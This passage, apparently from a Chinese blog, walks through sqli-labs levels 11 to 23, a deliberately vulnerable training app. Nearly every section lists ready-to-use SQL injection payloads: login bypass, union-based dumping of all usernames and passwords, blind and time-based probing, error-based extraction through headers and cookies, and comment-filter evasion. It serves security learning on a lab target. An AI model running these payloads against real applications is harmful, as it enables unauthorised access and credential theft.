class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>知识点补充</strong></p><p>select 1=1 and 1=2;<br>select 1=1 or 1=2;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容：</span><br><span class="line"></span><br><span class="line">POST内容： uname&#x3D;‘ &amp; passwd&#x3D;1&amp;submit&#x3D;Submit 返回的结果显示你存在sql语法错误，证明存在注入漏洞。或这是直接在username中填写’，password中随便写判断一下是否存在注入漏洞。</span><br><span class="line"></span><br><span class="line">直接在username中填写 admin‘ or 1&#x3D;1#（此处不能使用--+，因为--+主要使用在url中，#是适用的）即： uname&#x3D;a’ or 1&#x3D;1 #&amp; passwd&#x3D;a &amp;submit&#x3D;Submit此时登录成功，可以验证存在注入漏洞。</span><br><span class="line"></span><br><span class="line">此时在password位置进行验证：uname&#x3D;a&amp;passwd&#x3D;a‘ or 1&#x3D;1# &amp;submit&#x3D;Submit，登录成功，开始构造！</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ order by 3#&amp;passwd&#x3D;a &amp;submit&#x3D;Submit或者是使用 uname&#x3D;a&amp;passwd&#x3D;a’ order by 2# &amp;submit&#x3D;Submit同样可以进行判断，最后得出一共有两列。</span><br><span class="line"></span><br><span class="line">uname&#x3D;a&amp;passwd&#x3D;a‘ union select database(),2  # &amp;submit&#x3D;Submit查询到当前的数据库为security，或者是使用：uname&#x3D;a’ union select database(),2  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit均可以查询到当前的数据库，当然也可以查询其它信息。</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ union select 1,(select schema_name from information_schema.schemata limit 1,1)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 可以查询到当前的第一个数据库，</span><br><span class="line">或者是使用命令：</span><br><span class="line">uname&#x3D;a’ union select 1,(select group_concat(schema_name) from information_schema.schemata)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 可以得到所有的数据库。</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 可以得到security数据库中的所有的表信息</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 通过users表获得里面的列值：id,username,password</span><br><span class="line"></span><br><span class="line">uname&#x3D;a‘ union select 1, group_concat(concat_ws(’~‘,username,password)) from security.users  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 此时就可以得到里面所有的数据。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Les-12：-POST-Error-Based-Double-quotes-String-with-twist"><a href="#Les-12：-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="Les-12：. POST - Error Based - Double quotes- String - with twist"></a>Les-12：. POST - Error Based - Double quotes- String - with twist</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容：</span><br><span class="line">1. 首先进行尝试： uname&#x3D;admin‘ &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  此时只是显示登陆失败，没有其他的回显，将’换为”</span><br><span class="line">2. uname&#x3D;admin“ &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  此时有回显，显示有报错信息，通过报错信息，我们知道如何进行构造：’)</span><br><span class="line">3. uname&#x3D;admin“) or 1&#x3D;1# &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  此时构造成功之后，显示登陆成功。接下来的和less-11相同。</span><br><span class="line">4. uname&#x3D;admin“) order by 3# &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  通过order by语句得到一共有两列。</span><br><span class="line">5. uname&#x3D;a&amp;passwd&#x3D;a&quot;) union select database(),2  # &amp;submit&#x3D;Submit查询到当前的数据库为security，或者是使用： uname&#x3D;a&quot;) union select database(),2  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit均可以查询到当前的数据库，当然也可以查询其它信息。</span><br><span class="line">6. uname&#x3D;a&quot;) union select 1,(select schema_name from information_schema.schemata limit 1,1)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit可以查询到当前的第一个数据库，或者是使用命令： uname&#x3D;a&quot;) union select 1,(select group_concat(schema_name) from information_schema.schemata)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit可以得到所有的数据库。</span><br><span class="line">7. uname&#x3D;a&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit可以得到security数据库中的所有的表信息</span><br><span class="line"></span><br><span class="line">8. uname&#x3D;a&quot;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273)  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit通过users表获得里面的列值：id,username,password</span><br><span class="line">9. uname&#x3D;a“) union select 1, group_concat(concat_ws(0x7e,username,password)) from security.users  # &amp;passwd&#x3D;a&amp;submit&#x3D;Submit 此时就可以得到里面所有的数据。 0x7e代表的就是  ~</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-13：POST-Double-Injection-Single-quotes-Strinq-with-twist"><a href="#Less-13：POST-Double-Injection-Single-quotes-Strinq-with-twist" class="headerlink" title="Less-13：POST- Double Injection - Single quotes- Strinq -with twist"></a>Less-13：POST- Double Injection - Single quotes- Strinq -with twist</h2><p>没有回显，我们采用盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select length(database());</span><br><span class="line">if()</span><br><span class="line">长度：if(length(database())&gt;1,1,sleep(5));  数据库字符长度是8</span><br><span class="line">left(database(),1)&#x3D;&#39;a&#39;</span><br><span class="line"></span><br><span class="line">uname&#x3D;ain&#39;) or left((select schema_name from information_schema.schemata limit 0,1),1)&gt;&#39;a&#39; #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  </span><br><span class="line">inf</span><br><span class="line">A-Z</span><br><span class="line">0_9</span><br><span class="line">_</span><br></pre></td></tr></table></figure><p><img src="/2020/07/13/sqlo-labs/image-20200522142405950.png" alt="image-20200522142405950"><img src="/2020/07/13/sqlo-labs/image-20200522142838946.png" alt="image-20200522142838946"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> uname&#x3D;admin &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  此时只是显示登陆成功，但是不会显示其他的信息。</span><br><span class="line"></span><br><span class="line">uname&#x3D;‘ &amp;passwd&#x3D;a&amp;submit&#x3D;Submit  直接通过报错信息知道了如何构造   构造：1’) or 1&#x3D;1#</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin‘) order by 2# &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  此时只是显示登陆成功，但是不会显示其他信息，考虑盲注。</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin‘) or if(length(database())&#x3D;8,1,sleep(5))# &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 此时可以得到数据库的长度是8.</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;ain‘) or left(database(),1)&gt;’a‘#&amp;submit&#x3D;Submit 使用or和left()来判断第一个字母是多少(注意的是这里不是使用and)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;ain‘) or left(database(),2)&#x3D;’se‘#&amp;submit&#x3D;Submit 通过这样一个个进行判断即可！</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;ain‘) or left((select schema_name from information_schema.schemata limit 0,1),1)&gt;’a‘#&amp;submit&#x3D;Submit 或者是使用这种方法也是可以判断的。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-14-POST-Double-Injection-Single-quotes-String-with-twist"><a href="#Less-14-POST-Double-Injection-Single-quotes-String-with-twist" class="headerlink" title="Less-14  POST -Double Injection- Single quotes String -with twist"></a>Less-14  POST -Double Injection- Single quotes String -with twist</h2><p> uname=admin “ or length(database())=’8’#&amp;passwd=admin&amp;submit=Submit<br> A or B<br> A and B </p><p>uname=ain” or left((select schema_name from information_schema.schemata limit 0,1),1)=’u’ #&amp;passwd=admin&amp;submit=Submit<br>uname=adin “ or left((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1)&gt;’a’#&amp;passwd=admin&amp;submit=Submit<br>uname=adin “ or left((select column_name from information_schema.columns where table_name=’users’ limit 0,1),1)=’a’#&amp;passwd=admin&amp;submit=Submit  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">首先在代码中加入两行:  echo $sql;              echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">1. uname&#x3D;admin&amp;passwd&#x3D;a“&amp;submit&#x3D;Submit   构造：&quot; or 1&#x3D;1#</span><br><span class="line">2. uname&#x3D;admin&amp;passwd&#x3D;a“ order by 10#&amp;submit&#x3D;Submit 判断一共有多少列</span><br><span class="line">3. uname&#x3D;admin&amp;passwd&#x3D;a“ or if(length(database())&#x3D;8,1,sleep(5))# #&amp;submit&#x3D;Submit 使用和less-13同样的方法进行判断</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less15-POST-Blind-Boolian-time-Based-Single-quotes"><a href="#Less15-POST-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="Less15-POST -Blind- Boolian/time Based - Single quotes"></a>Less15-POST -Blind- Boolian/time Based - Single quotes</h2><p>没有错误显示，可以选择延时注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">首先在代码中加入两行: </span><br><span class="line">echo $sql;             </span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">1. uname&#x3D;admin&amp;passwd&#x3D;a“&amp;submit&#x3D;Submit    构造：1‘ or 1&#x3D;1#   在这里判断列数没有实际意义了</span><br><span class="line">2. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand&#39; or if(length(database())&gt;1000,1,sleep(5))#&amp;submit&#x3D;Submit通过这个来判断其长度</span><br><span class="line">3. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand&#39; or if(length()&gt;1000,1,sleep(5))#&amp;submit&#x3D;Submit</span><br><span class="line">4. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand‘ or left((select table_name from information_schema.tables where table_schema&#x3D;’security‘ limit 0,1),1)&gt;’a‘#&amp;submit&#x3D;Submit 使用和less-13相同的方法进行判断，就可以判断出当前security库的第一个表的第一个字母是否大于a</span><br><span class="line">5. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand‘ or left((select column_name from information_schema.columns where table_name&#x3D;’users‘ limit 0,1),1)&gt;’g‘#&amp;submit&#x3D;Submit 通过同样的方法可以判断users表中的字段数据是否大于g</span><br><span class="line">6. uname&#x3D;adminadmin&amp;passwd&#x3D;admiand‘ or left((select username from security.users limit 0,1),1)&gt; ’a‘#&amp;submit&#x3D;Submit通过这个来判断security.users下的username下第一个字段的第一位，在这里不能直接使用select username,password来一起查询，需要一个个进行查询</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Less-17</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容：</span><br><span class="line">首先在代码中加入两行:  echo $sql;              echo “&lt;&#x2F;br&gt;”;  而且要是update后也加上。</span><br><span class="line">使用了get_magic_quotes_gpc      name和password分开验证，而且在验证的时候对于name进行了过滤处理，将’进行了转义</span><br><span class="line">首先我们要知道用户的名字是多少，然后才可以进行接下来的操作</span><br><span class="line">1. uname&#x3D;admin&amp;passwd&#x3D;adm ‘ and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security‘ limit 0,1),0x7e),1)#&amp;submit&#x3D;Submit  通过查询，可以得到security库下面的其中一个表名字</span><br><span class="line">2. uname&#x3D;admin&amp;passwd&#x3D;adm ‘ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users‘ limit 0,1),0x7e),1)#&amp;submit&#x3D;Submit 同样的方法可以获得其他的数据</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-18-POST-Header-Injection-Uagent-field-Error-based"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based" class="headerlink" title="Less-18:POST-Header Injection - Uagent field - Error based"></a>Less-18:POST-Header Injection - Uagent field - Error based</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容： ‘and updatexml(1,concat(0x7e,(database()),0x7e),1) and ’1‘&#x3D; ‘1注册登录再注入</span><br><span class="line">1. 登录失败显示ip地址</span><br><span class="line">2. 登录成功显示ip地址和User-Agent</span><br><span class="line">3. $insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</span><br><span class="line">4. 分析后得知，需要进行闭合操作，两种方法：</span><br><span class="line">（1）&#39; or updatexml(1,concat(0x7e,(database())),1) and &#39;1&#39;&#x3D;‘1</span><br><span class="line">（2）‘ or updatexml(1,concat(0x7e,(database())),1), “, ‘’)# (注意在直接复制的时候，可能出现错误)</span><br><span class="line">然后再通过mysql注入语句进行操作即可！</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>摸索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;Mn.0&#39;, &#39;127.0.0.1&#39;, &#39;admin&#39;)</span><br><span class="line">&#39; or updatexml(1,concat(0x7e,()),1);</span><br><span class="line">select  updatexml(1,concat(0x7e,(database())),1);</span><br><span class="line">第一种</span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(database())),1) or &#39;1&#39;&#x3D;&#39;1      # or &#39;1&#39;&#x3D;&#39;1是为了闭合&#39;Mn.0&#39;的右边的&#39;</span><br><span class="line">第二种</span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(database())),1), &#39;&#39;,&#39;&#39;)#       #concat后面的&#96;&#39;&#39;,&#39;&#39;)#&#96;可以将ip_address和username闭合掉，然后#注释后面的语句</span><br><span class="line">后面的payload是根据前面的两种方法就行的构造，来获取自己想要的东西</span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1), &#39;&#39;,&#39;&#39;)# </span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1)),1), &#39;&#39;,&#39;&#39;)# </span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1)),1), &#39;&#39;,&#39;&#39;)# </span><br><span class="line">&#39; or updatexml(1,concat(0x7e,(select username from security.users limit 0,1)),1), &#39;&#39;,&#39;&#39;)# </span><br></pre></td></tr></table></figure><h2 id="Less-19：POST-Header-Injection-Referer-field-Error-based-A"><a href="#Less-19：POST-Header-Injection-Referer-field-Error-based-A" class="headerlink" title="Less-19：POST-Header Injection -Referer field -Error based A"></a>Less-19：POST-Header Injection -Referer field -Error based A</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容： ‘and updatexml(1,concat(0x7e,(database()),0x7e),1) and ’1‘&#x3D; ‘1注册登录再注入</span><br><span class="line">1. 登录成功显示的是Referer信息</span><br><span class="line">2. 登录失败是没有回显信息的</span><br><span class="line">3. $insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;referers&#96; (&#96;referer&#96;, &#96;ip_address&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;</span><br><span class="line">4. 分析后得知，需要进行闭合操作，两种方法：</span><br><span class="line">（1）&#39; or updatexml(1,concat(0x7e,(database())),1) and &#39;1&#39;&#x3D;‘1</span><br><span class="line">（2）‘ or updatexml(1,concat(0x7e,(database())),1), ‘’)#  (注意在直接复制的时候，可能出现错误，因为ppt格式的问题)</span><br><span class="line">然后再通过mysql注入语句进行操作即可！</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less20：POST-Cookie-injections-Uagent-field-error-based"><a href="#Less20：POST-Cookie-injections-Uagent-field-error-based" class="headerlink" title="Less20：POST - Cookie injections - Uagent field - error based."></a>Less20：POST - Cookie injections - Uagent field - error based.</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容</span><br><span class="line">注册登录再注入</span><br><span class="line">1.登录成功之后会显示cookie</span><br><span class="line">2. 登录失败会显示失败信息。</span><br><span class="line">3. $sql&#x3D;“SELECT * FROM users WHERE username&#x3D;‘$cookee’ LIMIT 0,1”; 在登录之后后台会将username放入cookie中，再次登录的时候，只要是cookie没有过期，就会去cookie里面取值，然后进行查询。</span><br><span class="line">4.  使用chrome工具： Cookie Editor</span><br><span class="line">5.  ‘ union select 1,2,database()#</span><br><span class="line">6. 接下来就是常见的注入教程。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-21：POST-Dump-into-outfile-String"><a href="#Less-21：POST-Dump-into-outfile-String" class="headerlink" title="Less-21：POST- Dump into outfile - String"></a>Less-21：POST- Dump into outfile - String</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容</span><br><span class="line">注册登录再注入</span><br><span class="line">1.登录成功之后会显示一系列信息</span><br><span class="line">2. 登录失败会显示失败信息。</span><br><span class="line">3.  和第20关相似，只不过这一次将admin进行base64转码    YWRtaW4&#x3D;  解码之后为admin</span><br><span class="line">4.  使用chrome工具： Cookie Editor</span><br><span class="line">5. &#39;) union select 1,2,database()#</span><br><span class="line">6. 接下来就是常见的注入教程。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-22：Future-Editions"><a href="#Less-22：Future-Editions" class="headerlink" title="Less-22：Future Editions"></a>Less-22：Future Editions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下均为POST内容</span><br><span class="line">注册登录再注入</span><br><span class="line">1.登录成功之后会显示一系列信息</span><br><span class="line">2. 登录失败会显示失败信息。</span><br><span class="line">3.  和第21关相似，只不过这一次将’) 换为” 即可！</span><br><span class="line">4.  使用chrome工具： Cookie Editor</span><br><span class="line">5. “ union select 1,2,database()#</span><br><span class="line">6. 接下来就是常见的注入教程。</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Less-23-GET-Error-based-strip-comments"><a href="#Less-23-GET-Error-based-strip-comments" class="headerlink" title="Less-23: GET Error based strip comments"></a>Less-23: GET Error based strip comments</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">首先在代码中加入：</span><br><span class="line">echo $sql;</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1 显示的有信息</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1’ 此时显示报错</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1’--+ 此时无法进行闭合</span><br><span class="line">4. 我们回到less-01 在第一关中，我们看到可以正常使用闭合。此时我们查阅源码：</span><br><span class="line"></span><br><span class="line">$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;</span><br><span class="line">$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;</span><br><span class="line">$replace &#x3D; &quot;&quot;;     </span><br><span class="line"></span><br><span class="line">$id &#x3D; preg_replace($reg, $replace, $id);</span><br><span class="line">$id &#x3D; preg_replace($reg1, $replace, $id);   源码中对于 --+      # 进行了过滤处理， 所以这里我们只能使用and 或者or语句进行闭合,--和#全都替换成空了</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在这里可以使用另外一种特殊的注释符   ;%00 通过这个注释符可以判断列数</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>法一</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">在这里可以使用另外一种特殊的注释符   ;%00 通过这个注释符可以判断列数</span><br><span class="line">除了在url末尾将--+、# 替换为 ;%00   其余的均和less01关相同。</span><br><span class="line"></span><br><span class="line">1. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1 返回正常</span><br><span class="line">2. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1’ 返回异常，说明可能存在漏洞</span><br><span class="line">3. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1’ --+  或者http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1’ # 均返回错误，通过源代码分析，我们得知--+    #  都被替换为了空格，这里使用      ;%00充当注释符</span><br><span class="line">4. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;1‘  order by 3  ;%00 查多少列</span><br><span class="line">5. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1’  union select 1,2,3    ;%00   查找回显位置</span><br><span class="line">6. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1‘  union select 1,2, group_concat(schema_name) from    information_schema.schemata    ;%00 查库名</span><br><span class="line">7. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1‘  union select 1,2, group_concat(table_name) from  information_schema.tables where table_schema &#x3D; 0x7365637572697479    ;%00  查表名</span><br><span class="line">8. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1‘  union select 1,2, group_concat(column_name) from information_schema.columns where table_name &#x3D; 0x7573657273   ;%00 查字段名</span><br><span class="line">9. http:&#x2F;&#x2F;121.199.30.46&#x2F;Less-23&#x2F;?id&#x3D;-1‘  union select 1,2, group_concat(concat_ws(0x7e,username,password)) from security.users   ;%00 查出字段中所有的值</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="sql-语句解析顺序"><a href="#sql-语句解析顺序" class="headerlink" title="sql 语句解析顺序"></a>sql 语句解析顺序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">参考链接： https:&#x2F;&#x2F;www.cnblogs.com&#x2F;annsshadow&#x2F;p&#x2F;5037667.html</span><br><span class="line"></span><br><span class="line">以less-23为例，我们使用正常的order by来查询一下一共有多少列：</span><br><span class="line"></span><br><span class="line">1. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ order by 10 因为没有闭合，所以肯定会报错</span><br><span class="line">2. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ order by 10 and  ’1‘&#x3D;‘1 返回是正常的，但是由于我们已知肯定没有10列，这是为什么还会返回正常？</span><br><span class="line">3. http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-23&#x2F;?id&#x3D;1‘ order by 10 or ’1‘&#x3D;‘1 此时使用or，返回依旧正常。</span><br><span class="line"></span><br><span class="line">我们回到mysql命令行，执行以下语句：</span><br><span class="line"></span><br><span class="line">1. select * from users where id &#x3D;1 ; 此时返回数据肯定是正常的。</span><br><span class="line">2. select * from users where id &#x3D;1  and 1&#x3D;1; 此时返回数据也是正常的。</span><br><span class="line">3. select * from users where id &#x3D;1  or  1&#x3D;1;   此时返回了所有的数据。</span><br><span class="line">4. select * from users where id &#x3D;11111  or  1&#x3D;1; 此时也是返回了所有的数据。 说明执行的时候是  A or B </span><br><span class="line">5. select * from users where id &#x3D;1 order by 3; 返回正常，肯定正常。</span><br><span class="line">6. select * from users where id &#x3D;1  order by 3 and 1&#x3D;1; 此时依旧返回正常。</span><br><span class="line">7. select * from users where id &#x3D;1  order by 4444 and 1&#x3D;1;   此时返回正常</span><br><span class="line"></span><br><span class="line">8.  select * from users where id &#x3D;1  order by 4444 or  1&#x3D;1;   依旧返回正常</span><br><span class="line">9.  select * from users where id &#x3D;1  and 1&#x3D;1 order by 3;  此时返回正常</span><br><span class="line">10. select * from users where id &#x3D;1  and 1&#x3D;1 order by 3333;  返回不存在这个列，也可以理解为正常。</span><br><span class="line">11. select * from users where id &#x3D;1111  and 1&#x3D;1 order by 3;   返回为空，但是语句执行正常。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img 